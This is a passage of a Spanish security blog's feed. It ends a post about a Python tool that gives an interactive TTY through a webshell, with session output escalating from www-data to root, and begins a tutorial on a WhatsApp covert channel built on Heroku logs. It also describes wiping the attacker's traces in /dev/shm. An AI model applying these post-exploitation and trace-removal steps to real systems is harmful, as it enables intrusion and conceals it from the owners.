&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;started&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*************&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Aquí&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;va&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vuestra&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contraseña&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;░▒▓&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;✔&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;▓▒░&lt;/span&gt;                                                  
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌──&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌──&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;***********&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Aquí&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;va&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vuestra&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;contraseña&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;░▒▓&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;✔&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;▓▒░&lt;/span&gt;                                                
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌──&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌──&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podréis comprobar, tenemos una TTY completamente interactiva, pudiendo hacer todo lo que haríamos desde consola pero gestionado todo a través de una webshell. Y cómo no… no nos hemos entablado una Reverse Shell, buena esa.&lt;/p&gt;

&lt;p&gt;Si presionáis la tecla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl+C&lt;/code&gt;, se eliminarán todos los ficheros temporales del sistema víctima creados para gestionar la sesión, limpiando así el rastro que como atacantes estamos dejando bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm/&lt;/code&gt;.&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Scripting" /><category term="Utilidades" /><category term="Python" /><category term="Web Exploiting" /><category term="Herramientas" /><summary type="html">Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.</summary></entry><entry><title type="html">Canal encubierto en WhatsApp</title><link href="http://localhost:4000/canal-encubierto-whatsapp/" rel="alternate" type="text/html" title="Canal encubierto en WhatsApp" /><published>2020-02-03T00:00:00+01:00</published><updated>2020-02-03T00:00:00+01:00</updated><id>http://localhost:4000/canal-encubierto-whatsapp</id><content type="html" xml:base="http://localhost:4000/canal-encubierto-whatsapp/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/whatsapp-banner.jpeg&quot; width=&quot;500&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;En el siguiente artículo, os muestro una forma de mantener conversaciones encubiertas sin que quede registro en el historial de conversaciones de WhatsApp. De esta forma, dos personas pueden mantener una conversación mediante la lectura de logs a tiempo de escritura sin necesidad de enviar el mensaje.&lt;/p&gt;

&lt;h2 id=&quot;antecedentes&quot;&gt;Antecedentes&lt;/h2&gt;

&lt;p&gt;Para poder poner en práctica esta utilidad, en mi caso cuento con un servidor web alojado en &lt;a href=&quot;https://www.heroku.com/&quot;&gt;Heroku&lt;/a&gt;. Este paso es opcional, vosotros podréis usar lo que queráis… incluso un servidor HTTP montado con Python desde vuestro VPS.&lt;/p&gt;

&lt;p&gt;La URL que estaré utilizando para el canal encubierto será la siguiente:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://s4vitar.herokuapp.com&quot;&gt;http://s4vitar.herokuapp.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/whatsapp-canal-encubierto/page-herokuapp.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Entonces bien, ¿cómo hacemos?, pues fijaros. Una de las utilidades de heroku es el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heroku logs -t&lt;/code&gt; aplicado desde consola, donde podemos visualizar las peticiones a tiempo real en formato log que se están realizando contra el servidor. Para el que no cuente con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;heroku&lt;/code&gt; instalado en el sistema, podéis aplicar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snap install heroku --classic&lt;/code&gt; y ya lo tendríais.&lt;/p&gt;

&lt;p&gt;Posteriormente, deberéis aplicar el siguiente comando desde consola para iniciar sesión con vuestra cuenta:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Press&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;browser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Opening&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;browser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//cli-auth.heroku.com/auth/cli/browser/35e6XXXX-XXXX-XXXX-87d0-bf7ff75XXXXX&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Waiting&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;⣟&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Se os abrirá el navegador (en caso de que no se os abra, simplemente tenéis que acceder a la URL que se os proporciona). Una vez logueados, deberíais ver lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Press&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;browser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;Opening&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;browser&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//cli-auth.heroku.com/auth/cli/browser/35e6XXXX-XXXX-XXXX-87d0-bf7ff75XXXXX&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Logging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Logged&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitarx&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gmail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Os descargáis el repositorio correspondiente a la página web que se dispone de forma pública:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;git&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Clonando&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;en&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Counting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Compressing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Total&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reused&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Desempaquetando&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objetos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;
